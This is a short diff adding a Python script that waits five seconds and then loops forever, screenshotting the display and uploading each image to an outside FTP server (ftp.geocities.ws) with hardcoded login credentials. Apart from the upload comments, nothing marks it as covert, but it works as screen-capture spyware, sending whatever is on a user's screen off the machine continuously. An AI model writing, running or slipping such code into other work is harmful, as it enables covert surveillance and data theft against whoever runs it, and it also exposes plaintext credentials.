@@ -1,0 +1,13 @@
+import time
+import pyscreenshot
+import ftplib
+time.sleep(5)
+while True:
+	pyscreenshot.grab()
+	pyscreenshot.grab_to_file('hello.png')
+	session = ftplib.FTP('ftp.geocities.ws','sefgfaulted','wepartyrock')
+	session.cwd("fah")
+	file = open('hello.png','rb')                  # file to send
+	session.storbinary('STOR hello.png', file)     # send the file
+	file.close()                                    # close file and FTP
+	session.quit()
